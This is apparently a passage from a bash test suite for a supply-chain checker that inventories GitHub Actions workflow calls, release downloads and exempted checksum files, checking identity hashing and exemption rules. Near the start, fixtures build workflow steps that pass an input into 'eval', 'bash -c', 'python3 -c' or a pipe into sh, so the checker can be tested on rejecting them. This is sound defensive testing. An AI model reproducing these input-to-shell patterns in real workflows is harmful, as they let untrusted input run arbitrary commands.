mkcallee() { # NAME 'run text' -> $work/NAME.yml: a callee with one step handing inputs.x to env X and running the text
  printf 'on:\n  workflow_call:\n    inputs:\n      x:\n        type: string\njobs:\n  k:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          X: ${{ inputs.x }}\n          CLIENT: npm\n        run: %s\n' "$2" >"$work/$1.yml"
}
n=0
for run in '"$CLIENT" install "$X"' 'eval "$X"' 'bash -c "$X"' 'bash bin/s.sh "$X" | sh' 'bash bin/s.sh $(echo "$X")' 'bash bin/s.sh "$X" && "$CLIENT" install "$X"' 'bash ../s.sh "$X"' 'python3 -c "$X"' 'sh "$X"'; do
  n=$((n+1)); mkcallee "envbad$n" "$run" ; python3 - "$work/envbad$n.yml" <<'PY'
import sys
t = open(sys.argv[1]).read().replace("run: ", "run: '", 1).rstrip("\n").replace("\n  ", "\n  ")
open(sys.argv[1], "w").write(t + "'\n")
PY
  lcallc "me$n" './.github/workflows/callee.yml' $'    with:\n      x: lodash@latest\n' "$work/envbad$n.yml"
  lck "me$n"
  CASE="AC19: a step that hands an input to env and runs [$run] is not a literal script invocation: the call stays an item (exit 1)"
  check test "$rc" -eq 1
done

# --- the closed form (orchestrator, Oct 14): a with-bearing local call is ruled by a base-branch row bound to its identity ---------------------------------
printf '%s\n' "on: workflow_call" "jobs:" "  k:" "    runs-on: ubuntu-latest" "    steps:" "      - uses: actions/checkout@$SHA1 # v4.1.0" >"$work/callee-w.yml"
lcallc w1 './.github/workflows/callee.yml' $'    with:\n      mode: release\n' "$work/callee-w.yml"
lck w1
CASE="AC19 closed form: a call with a with: block is an item that cannot pass (exit 1)"
check test "$rc" -eq 1
lcallc w2 './.github/workflows/callee.yml' $'    with: {}\n' "$work/callee-w.yml"
lck w2
CASE="AC19 closed form: an EMPTY with: block is no with: (exit 0)"
check test "$rc" -eq 0
# lcrow OUT MODE REPO: a row built from the real inventory of REPO's head, the hash computed here from the item's whole key
lcrow() {
  python3 - "$1" "$2" "$work/$3" "$here/../supply-chain/pin-inventory.py" <<'PY'
import hashlib, importlib.util, json, sys
out, mode, repo, invp = sys.argv[1:5]
spec = importlib.util.spec_from_file_location("inv", invp); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
head = inv.load_at(repo, "HEAD"); base = inv.load_at(repo, "HEAD~1")
keys = [k for k in head if k not in base and "(local)" in k]
assert len(keys) == 1, keys
h = hashlib.sha256(keys[0].encode()).hexdigest()
row = {"file": ".github/workflows/ci.yml", "form": "a local reusable workflow call", "key": h, "line": h,
       "ruling": "local reusable workflow call; inputs reviewed in the PR that added them; advisor ruling Oct 14"}
if mode == "wrongfile": row["file"] = ".github/workflows/other.yml"
elif mode == "wrongform": row["form"] = "a download"
elif mode == "wronghash": row["key"] = row["line"] = ("0" if h[0] != "0" else "1") + h[1:]
elif mode != "ok": raise SystemExit(mode)
json.dump({"_format": "t", "exceptions": [], "unmeasured_text": [row]}, open(out, "w"))
PY
}
lcrow "$work/lc-ok.json" ok w1
rc=0; python3 "$chk" --root "$work/w1" --base HEAD~1 --head HEAD --exceptions "$work/lc-ok.json" >"$work/w1r.out" 2>&1 || rc=$?
CASE="AC19 closed form: a base-branch row naming the call's file and whole identity rules it: exit 0, reported as ruled text with the ruling"
check test "$rc" -eq 0; check grep -q 'advisor ruling Oct 14' "$work/w1r.out"
for m in wrongfile wrongform wronghash; do
  lcrow "$work/lc-$m.json" $m w1
  rc=0; python3 "$chk" --root "$work/w1" --base HEAD~1 --head HEAD --exceptions "$work/lc-$m.json" >"$work/w1r.out" 2>&1 || rc=$?
  CASE="AC19 closed form: a row with the $m does not rule the call (exit 1)"
  check test "$rc" -eq 1
done
lcallc w3 './.github/workflows/callee.yml' $'    with:\n      mode: debug\n' "$work/callee-w.yml"
rc=0; python3 "$chk" --root "$work/w3" --base HEAD~1 --head HEAD --exceptions "$work/lc-ok.json" >"$work/w3r.out" 2>&1 || rc=$?
CASE="AC19 closed form: editing the with: block voids the row (the identity carries the block's hash): exit 1"
check test "$rc" -eq 1

# round 6 of the review: a padded reference is a different identity, so the row of the exact call never rules it
for pad in '" ./.github/workflows/callee.yml"' '"./.github/workflows/callee.yml "'; do
  printf '%s' "$pad" >"$work/lcall.uses"
  printf '%s' $'    with:\n      mode: release\n' >"$work/lcall.with"
  n="pad$(printf '%s' "$pad" | cksum | cut -d' ' -f1)"
  newcase "$n" "
import pathlib
w = pathlib.Path('.github/workflows')
(w / 'callee.yml').write_text(pathlib.Path(r'$work/callee-w.yml').read_text())
c = w / 'ci.yml'
c.write_text(c.read_text() + '  c:\n    uses: ' + pathlib.Path(r'$work/lcall.uses').read_text() + '\n    with:\n      mode: release\n')"
  rc=0; python3 "$chk" --root "$work/$n" --base HEAD~1 --head HEAD --exceptions "$work/lc-ok.json" >"$work/$n.out" 2>&1 || rc=$?
  CASE="AC19: the exact call's row does not rule the padded spelling $pad of the same call (exit 1)"
  check test "$rc" -eq 1
done

# round 8 of the review (both seats): an identity digest is never truncated; brute-forced 32-bit and 40-bit collision pairs stay two items
CASE="AC19: two local references (expressions) and two with: blocks that collided under the old 32-bit and 40-bit digests are four different identities, and swapping one for the other MOVES an item"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
a, b = "./.github/workflows/${{ inputs.v81708 }}.yml", "./.github/workflows/${{ inputs.v83546 }}.yml"
assert inv._local_name(a) != inv._local_name(b)
assert len(inv._local_name(a).split("~")[1]) == 64
def tree(uses, with_):
    return {".github/workflows/a.yml": "jobs:\n  c:\n    uses: '%s'\n    with:\n      mode: %s\n" % (uses, with_)}
k1 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value98725")))
k2 = set(inv.inventory(tree("./.github/workflows/callee.yml", "value793926")))
assert k1 != k2 and all(len(k.split("#with:")[1]) == 64 for k in k1 | k2 if "#with:" in k), (k1, k2)
j1, j2 = set(inv.inventory(tree(a, "x"))), set(inv.inventory(tree(b, "x")))
assert j1 != j2
PY

# identity digests are the full sha256; a call row must resolve to exactly one item of a tree (the assertion the review asked for)
CASE="full sha256: a local-call row resolves to exactly one item of the tree it names, a row with a wrong hash resolves to none"
check python3 - "$chk" "$work/w1" "$work/lc-ok.json" "$work/lc-wronghash.json" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
assert ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[3]) == []
bad = ac.unresolved_call_rows(sys.argv[2], "HEAD", sys.argv[4])
assert len(bad) == 1, bad
# a correct key with a wrong line rules nothing, so it is unresolved (the consumer looks up (file, form, h, h))
import json, copy
d = json.load(open(sys.argv[3])); r = d["unmeasured_text"][0]; r["line"] = ("0" if r["line"][0] != "0" else "1") * 64
import tempfile
with tempfile.NamedTemporaryFile("w", suffix=".json") as f:
    f.write(json.dumps(d)); f.flush()
    assert len(ac.unresolved_call_rows(sys.argv[2], "HEAD", f.name)) == 1
PY
CASE="full sha256: every committed local-call row is a 64-hex key equal to its line, and a ruling that starts with the call phrase"
check python3 - "$root/.github/supply-chain-exceptions.json" <<'PY'
import json, re, sys
for r in json.load(open(sys.argv[1]))["unmeasured_text"]:
    if r["form"] == "a local reusable workflow call":
        assert r["key"] == r["line"] and re.fullmatch(r"[0-9a-f]{64}", r["key"]) and r["ruling"].startswith("local reusable workflow call; "), r
PY

CASE="full sha256: the collision pairs both seats reproduced under the old 32-48 bit tags (a checksum set, a step tag of an expression, a default-installer step) are different identities"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def keys(files): return set(inv.inventory(files))
# a step tag: the same go install with two different input expressions
w = lambda v: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: go install example.com/tool@${{ inputs.%s }}\n" % v}
assert keys(w("v205063")) != keys(w("v1326818"))
# a checksum set: the same release download with two different 64-hex checksums that collided under the 32-bit tag
c = lambda s: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - run: |\n          curl -fsSL https://github.com/o/r/releases/download/v1.0.0/x.tgz -o x.tgz\n          echo '%s  x.tgz' | sha256sum -c -\n" % s.rjust(64, "0")}
assert keys(c("7158")) != keys(c("1f235"))
# a default-installer step: two steps differing only outside with/uses
d = lambda n: {".github/workflows/a.yml": "jobs:\n  j:\n    runs-on: x\n    steps:\n      - uses: actions/setup-python@%s # v6.1.0\n        name: collision-%s\n" % ("4" * 40, n)}
assert keys(d("8189")) != keys(d("89291"))
for k in keys(c("7158")) | keys(w("v205063")):
    tag = k.split("#", 1)[1] if "#" in k else ""
    if tag.startswith(("step:", "default:")):
        assert len(tag.split(":")[-1]) == 64, k
PY

# --- REQ-SUP-001-AC21: a file named by .github/policy/base-inputs.json is no item (orchestrator Oct 14: the plainest closed form, no pattern on names) ---------------
# The list is read from the base branch's copy beside the script (CI: trusted/), or --base-inputs FILE; a file listed there is the repository's own base record
# (its content change is the chain's base-input-changed signal). A missing list exempts nothing; a malformed one stops the check (exit 2).
printf '%s\n' "sha256:aaaa  x" >"$work/bi-keys.sha256"
newcase bi "
import pathlib
p = pathlib.Path('build/locks'); p.mkdir(parents=True, exist_ok=True)
(p / 'archive-keys.sha256').write_text('wolfi-signing.rsa.pub sha256:' + 'a' * 64 + '\\n')
(p / 'archive-index.sha256').write_text('x86_64 sha256:' + 'b' * 64 + '\\n')"
# the checker's default list is the copy beside the script: a copy of the agent directory with an EMPTY policy list stands for "no list" (the tree itself may carry a real one)
mkdir -p "$work/sc/.github/policy" && cp -R "$here/.." "$work/sc/.github/agent" && printf '%s' '{"base_inputs": []}' >"$work/sc/.github/policy/base-inputs.json"
chk_nolist="$work/sc/.github/agent/supply-chain/pin-age-check.py"
bick() { # LISTFILE-or-empty [extra] -> rc, $work/bi.out
  local lf=$1; shift; rc=0
  if [ -n "$lf" ]; then python3 "$chk" --root "$work/bi" --base HEAD~1 --head HEAD --base-inputs "$lf" "$@" >"$work/bi.out" 2>&1 || rc=$?
  else python3 "$chk_nolist" --root "$work/bi" --base HEAD~1 --head HEAD "$@" >"$work/bi.out" 2>&1 || rc=$?; fi
}
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256"]}' >"$work/bi-ok.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-one.json"
printf '%s' '{"base_inputs": ["build/locks/other.sha256", "./build/locks/archive-keys.sha256", "build/locks/../locks/archive-keys.sha256"]}' >"$work/bi-near.json"
printf '%s' '{"base_inputs": "build/locks/archive-keys.sha256"}' >"$work/bi-str.json"
printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", 7]}' >"$work/bi-int.json"
printf '%s' '{"base_inputs": [], "base_inputs": ["build/locks/archive-keys.sha256"]}' >"$work/bi-dup.json"
printf '%s' 'not json' >"$work/bi-bad.json"
printf '%s' '{"base_inputs": []}' >"$work/bi-empty.json"
bick "$work/bi-empty.json"
CASE="AC21: with an empty list, two new checksum record files are items that cannot pass (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 2
bick "$work/bi-ok.json"
CASE="AC21: a list naming both files exempts both: exit 0, each reported as a base input"
check test "$rc" -eq 0; check test "$(grep -c 'base input' "$work/bi.out")" -eq 2
bick "$work/bi-one.json"
CASE="AC21: a list naming one exempts exactly that one: the other still fails (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 1; check grep -q 'archive-index' "$work/bi.out"
bick "$work/bi-near.json"
CASE="AC21: near spellings (another name, ./ prefix, .. inside) exempt nothing: exact path equality only (exit 1)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi.out")" -eq 2
for f in bi-str bi-int bi-dup bi-bad; do
  bick "$work/$f.json"
  CASE="AC21: a malformed list ($f) stops the check, never 'nothing exempted' and never 'everything' (exit 2)"
  check test "$rc" -eq 2
done
# an EXPLICIT --base-inputs path that does not exist is a refusal (the default file may be missing and list nothing; a named one may not): exit 2 naming the path, never "nothing exempted"
bick "$work/no-such-list.json"
CASE="AC21: an explicit --base-inputs path that does not exist stops the check (exit 2, the message says it does not exist)"
check test "$rc" -eq 2; check grep -q 'does not exist' "$work/bi.out"; check grep -q 'no-such-list.json' "$work/bi.out"
# REQ-SUP-001-AC22: the committed list names the archive index record exactly (the daily refresh pull request moves it; rule 48: no seven-day hold on Wolfi)
CASE="AC22: the committed .github/policy/base-inputs.json names build/locks/archive-index.sha256 exactly once, beside the archive key record"
check python3 - "$root/.github/policy/base-inputs.json" <<'PY'
import json, sys
d = json.load(open(sys.argv[1]))["base_inputs"]
assert d.count("build/locks/archive-index.sha256") == 1 and "build/locks/archive-keys.sha256" in d, d
PY
bick "$root/.github/policy/base-inputs.json"
CASE="AC22: with the committed list, the moved archive index record and the archive key record are base inputs, no finding (exit 0)"
check test "$rc" -eq 0; check test "$(grep -c 'base input' "$work/bi.out")" -ge 2
rm -rf "$work/bi3"; cp -R "$work/bi" "$work/bi3"
( cd "$work/bi3" && printf '%s\n' "x86_64 sha256:cccc" >build/locks/archive-index.sha256.bak && mkdir -p docs && printf '%s\n' "x86_64 sha256:dddd" >docs/archive-index.sha256 && git add -A && git -c user.name=t -c user.email=t@x commit -qm lookalikes )
rc=0; python3 "$chk" --root "$work/bi3" --base HEAD~1 --head HEAD --base-inputs "$root/.github/policy/base-inputs.json" >"$work/bi3.out" 2>&1 || rc=$?
CASE="AC22: a name with a suffix and the same name in another directory stay items that cannot pass, with the committed list (exit 1, two findings)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/bi3.out")" -eq 2
# a pull request's own list is never read: the default is the copy beside the script, not the tree under --root
rm -rf "$work/bi2"; cp -R "$work/bi" "$work/bi2"
( cd "$work/bi2" && printf '%s\n' "x86_64 sha256:eeee" >build/locks/zz-record.sha256 && mkdir -p .github/policy && printf '%s' '{"base_inputs": ["build/locks/archive-keys.sha256", "build/locks/archive-index.sha256", "build/locks/zz-record.sha256"]}' >.github/policy/base-inputs.json && git add -A && git -c user.name=t -c user.email=t@x commit -qm list )
rc=0; python3 "$chk" --root "$work/bi2" --base HEAD~2 --head HEAD >"$work/bi2.out" 2>&1 || rc=$?
CASE="AC21: a list the pull request itself adds under --root exempts nothing (the default list is the base branch's copy beside the script): exit 1"
check test "$rc" -eq 1
# a missing default list lists nothing: a copy of the supply-chain dir with no .github/policy/base-inputs.json beside it exempts nothing and is not an error
rm -rf "$work/nl"; mkdir -p "$work/nl/.github/agent"; cp -R "$(dirname "$chk")" "$work/nl/.github/agent/supply-chain"
rc=0; python3 "$work/nl/.github/agent/supply-chain/$(basename "$chk")" --root "$work/bi" --base HEAD~1 --head HEAD >"$work/nl.out" 2>&1 || rc=$?
CASE="AC21: with no default list file at all, nothing is exempted and the check runs (exit 1, both record files still items; never exit 2, never exempt)"
check test "$rc" -eq 1; check test "$(grep -c 'FAIL tool:file:' "$work/nl.out")" -eq 2
CASE="AC21: only a checksum or version FILE item can be exempted: a download of the same path text from a workflow stays an item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
class I:  # a tool item that is NOT a (file) item although its name mentions the path
    kind = "tool"; name = "o/r/build/locks/archive-keys.sha256"; version = "v1.0.0"; src = None; raw = None; key = "tool:o/r/build/locks/archive-keys.sha256@v1.0.0"
class F:
    kind = "tool"; name = "file:build/locks/archive-keys.sha256"; version = "(file)"; src = None; raw = "build/locks/archive-keys.sha256"
    key = "tool:file:build/locks/archive-keys.sha256@(file)#content:x"
kept, ruled = ac.split_base_inputs([I(), F()], {"build/locks/archive-keys.sha256"})
assert [m.name for m in kept] == [I.name] and [m.name for m in ruled] == [F.name], (kept, ruled)
PY

# round 1 of the review of PR 340 (both seats): the exact path is the one git names, not the display name
CASE="AC21: a listed placeholder-looking path (build/\${var}/archive-keys.sha256) never exempts a different real path (build/\$OTHER/archive-keys.sha256), through the real inventory"
check python3 - "$chk" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
ac, inv = load("ac", sys.argv[1]), load("inv", sys.argv[2])
items = inv.inventory({"build/$OTHER/archive-keys.sha256": "x\n", "build/locks/archive-keys.sha256": "y\n"})
file_items = [i for i in items.values() if i.version == "(file)"]
assert len(file_items) == 2 and all(i.raw for i in file_items)
kept, ruled = ac.split_base_inputs(file_items, {"build/${var}/archive-keys.sha256", "build/locks/archive-keys.sha256"})
assert [i.raw for i in ruled] == ["build/locks/archive-keys.sha256"] and [i.raw for i in kept] == ["build/$OTHER/archive-keys.sha256"], (kept, ruled)
PY
CASE="AC21: renaming a file between two paths that _hide() folds (build/\${var}/... listed, build/\$OTHER/... not) with the same content is a MOVED item (the path is part of the identity), so the unlisted one fails"
check python3 - "$chk" "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
ac, inv = load("ac", sys.argv[1]), load("inv", sys.argv[2])
base = inv.inventory({"build/${var}/archive-keys.sha256": "same\n"})
head = inv.inventory({"build/$OTHER/archive-keys.sha256": "same\n"})
moved = inv.moved(base, head)
assert len(moved) == 1, moved
kept, ruled = ac.split_base_inputs(moved, {"build/${var}/archive-keys.sha256"})
assert len(kept) == 1 and not ruled
PY

CASE="two release downloads whose asset names differ only in the shell variable (or expression) they hold are two items, a changed variable is a moved item, and a concrete asset keeps its key (REQ-SUP-001-AC2: the check names every version that moved, a moved asset behind a variable included)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def dl(asset, tag="v1.2.3", where="bin/x.sh"):
    return {where: "curl -fsSL https://github.com/o/r/releases/download/%s/%s -o x\n" % (tag, asset)}
a, b = inv.inventory(dl("${A}.tgz")), inv.inventory(dl("${B}.tgz"))
assert len(a) == 1 and len(b) == 1 and set(a) != set(b), (sorted(a), sorted(b))
assert all("#step:" in k for k in list(a) + list(b)), (sorted(a), sorted(b))
assert set(a) == set(inv.inventory(dl("${A}.tgz"))), "the same spelling must give the same key"
assert len(inv.moved(a, b)) == 1, inv.moved(a, b)
# an expression, a braced variable and a bare one: each spelling is its own key
for x, y in (("${{ matrix.os }}.tgz", "${{ matrix.arch }}.tgz"), ("$OS.tgz", "$ARCH.tgz"), ("x_${OS}.tgz", "x_${ARCH}.tgz")):
    kx, ky = set(inv.inventory(dl(x))), set(inv.inventory(dl(y)))
    assert len(kx) == 1 and len(ky) == 1 and kx != ky, (x, y, sorted(kx), sorted(ky))
# a concrete asset is unchanged: no step tag, the key the inventory has always had
assert set(inv.inventory(dl("x.tgz"))) == {"tool:o/r/x.tgz@v1.2.3"}, sorted(inv.inventory(dl("x.tgz")))
# the same asset in a workflow step, the form every workflow takes
wf = lambda asset: {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl -fsSL https://github.com/o/r/releases/download/v1.2.3/%s -o x\n" % asset}
assert set(inv.inventory(wf("${A}.tgz"))) != set(inv.inventory(wf("${B}.tgz")))
PY

CASE="release downloads behind variables or expressions, round 1 findings: two assets in one step are two items; an identical added occurrence is a moved item; whitespace inside an expression literal is part of the identity; a scanner assignment and a composite input default are part of the identity (REQ-SUP-001-AC2: the check names every version that moved)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = lambda a: "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/" + a + " -o x"
def wf(run, name="ci.yml"):
    body = "".join("          " + l + "\n" for l in run.split("\n"))
    return {".github/workflows/" + name: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n" + body}
assert len(inv.inventory(wf(dl("${A}.tgz") + "\n" + dl("${B}.tgz")))) == 2
base = wf(dl("${A}.tgz")); head = dict(base); head[".github/workflows/other.yml"] = wf(dl("${A}.tgz"))[".github/workflows/ci.yml"]
assert len(inv.moved(inv.inventory(base), inv.inventory(head))) == 1
e1, e2 = "${{ contains('a  b', 'a b') }}.tgz", "${{ contains('a b', 'a b') }}.tgz"
assert len(inv.moved(inv.inventory(wf(dl(e1))), inv.inventory(wf(dl(e2))))) == 1
sc = lambda v: {"bin/install-scanner.sh": "A=" + v + "\n" + dl("${A}") + "\n"}
assert len(inv.moved(inv.inventory(sc("x.tgz")), inv.inventory(sc("y.tgz")))) == 1
co = lambda v: {".github/actions/x/action.yml": "name: x\ninputs:\n  asset:\n    default: " + v + "\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: " + dl("${{ inputs.asset }}") + "\n"}
assert len(inv.moved(inv.inventory(co("x.tgz")), inv.inventory(co("y.tgz")))) == 1
PY

CASE="an item whose asset path is a placeholder is no pin: judge_item refuses it (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
it = next(iter(inv.inventory({"bin/x.sh": "curl -fsSL https://github.com/o/r/releases/download/v1.2.3/${A}.tgz -o x\n"}).values()))
ok = age.judge_item(it)[0]
assert ok is False
PY

CASE="release downloads behind variables, round 2 findings: a later assignment, an indirect assignment (A=\$B) and the whitespace of a continued value are part of a script download's identity; a local composite call's with: value is part of the call's identity; an unrelated placeholder item keeps the key it had (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
dl = 'curl -fsSL "https://github.com/o/r/releases/download/v1.2.3/${A}" -o x\n'
variants = [("A=x.tgz\n" + dl + "A=z.tgz\n", "A=y.tgz\n" + dl + "A=z.tgz\n"),
            ("B=x.tgz\nA=$B\n" + dl, "B=y.tgz\nA=$B\n" + dl),
            ('A=$(printf "%s" "x\\\n  .tgz" | tr " " "_")\n' + dl, 'A=$(printf "%s" "x\\\n   .tgz" | tr " " "_")\n' + dl)]
for script in ("bin/install-scanner.sh", "bin/x.sh"):
    for before, after in variants:
        assert inv.moved(inv.inventory({script: before}), inv.inventory({script: after})), (script, before)
action = "name: x\ninputs:\n  asset:\n    default: x.tgz\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: curl https://github.com/o/r/releases/download/v1.2.3/${{ inputs.asset }}\n"
tree = lambda a: {".github/actions/x/action.yml": action, ".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n        with:\n          asset: " + a + "\n"}
assert inv.moved(inv.inventory(tree("x.tgz")), inv.inventory(tree("y.tgz")))
q = lambda v: {".github/workflows/ci.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://github.com/o/r/releases/download/v1.2.3/tool-\"${" + v + "}\".tgz\n"}
assert inv.moved(inv.inventory(q("A")), inv.inventory(q("B"))), "a variable after a quote is part of the asset name"
assert set(inv.inventory({"bin/x.sh": "pip install black\n"})) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
wfk = {".github/workflows/ci.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: pip install black\n"}
assert set(inv.inventory(wfk)) == {"package:pypi/black@(unpinned)#step:875cc02f02e6bc952fc1bca71c436657c10fc7e27058713fbd137cf0aed5eed8"}
PY

CASE="release downloads behind variables, round 3 findings: assignment ORDER, a name holding \$( ) with a space, composite input context kept apart from other items' keys, and a query variable that is not part of the name (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
dl = 'curl "' + url + '${A}.tgz" -o x\n'
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    assert inv.moved(inv.inventory({path: "B=x\nA=$B\nB=y\n" + dl}), inv.inventory({path: "B=y\nA=$B\nB=x\n" + dl})), path
wf = lambda asset: {".github/workflows/ci.yml": "on: push\nenv:\n  A: x\n  B: y\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl \"" + url + asset + "\" -o x\n"}
a, b = wf('$(printf %s "$A").tgz'), wf('$(printf %s "$B").tgz')
assert set(inv.inventory(a)) != set(inv.inventory(b))
it = next(iter(inv.inventory(b).values()))
assert "${" in it.path and "printf %s" in it.path, it.path
assert not age.judge_item(it)[0]
comp = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: pip install black\n"}
assert set(inv.inventory(comp)) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
assert all(it.step for it in inv.inventory(wf("x.tgz?download=${A}")).values())   # a quoted string holding a variable is unresolved (whole-file identity): fail-closed, advisor 0442
PY

CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
coll = lambda path, b, a: bool(inv.moved(inv.inventory({path: b}), inv.inventory({path: a})))
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for p in ("bin/x.sh", "bin/install-scanner.sh"):
    assert coll(p, "A=x\nA=y\n" + dl + "A=z\n", "A=y\nA=x\n" + dl + "A=z\n"), p
    cont = lambda n: 'curl "https://github.com/o/r/releases/download/v1.2.3/${A:-$(printf "%s" "x\\\n' + " " * n + '.tgz" | tr " " "_")}"\n'
    assert coll(p, cont(2), cont(3)), p
wf = lambda run: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"
latest = "curl https://github.com/o/r/releases/latest/download/${{ contains('a  b', 'a b') }}.tgz"
assert coll(".github/workflows/ci.yml", wf(latest), wf(latest.replace("'a  b'", "'a b'")))
PY

CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
wf = lambda run: {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"}
b1a, b1b = wf('curl "' + url + 'tool-"${A}.tgz'), wf('curl "' + url + 'tool-"${B}.tgz')
assert inv.moved(inv.inventory(b1a), inv.inventory(b1b))
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
for name in ("$(uname -m).tgz", "`uname -m`.tgz", "$1.tgz", "$((1+1)).tgz"):
    it = next(iter(inv.inventory(wf("curl " + url + "tool-" + name)).values()))
    assert it.step, (name, it.key)
    assert not age.judge_item(it)[0], name
dl = "curl " + url + "${B}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre in ("A=x B=", "export A=x B=", "declare -r B=", "export UNUSED=fixed B="):
        assert inv.moved(inv.inventory({path: pre + "old\n" + dl}), inv.inventory({path: pre + "new\n" + dl})), (path, pre)
PY

CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key (REQ-SUP-001-AC2)"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
